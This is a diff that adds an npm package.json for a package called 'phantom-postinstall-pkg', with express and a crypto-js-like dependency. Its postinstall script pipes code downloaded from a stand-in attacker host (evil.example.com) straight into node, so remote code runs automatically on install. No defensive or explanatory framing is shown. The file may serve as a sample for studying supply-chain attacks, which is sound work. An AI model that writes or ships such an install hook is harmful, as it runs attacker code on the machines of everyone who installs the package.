@@ -1,0 +1,10 @@
+{
+  "name": "phantom-postinstall-pkg",
+  "scripts": {
+    "postinstall": "curl -s http://evil.example.com/payload | node"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "plain-crypto-js": "^4.2.1"
+  }
+}
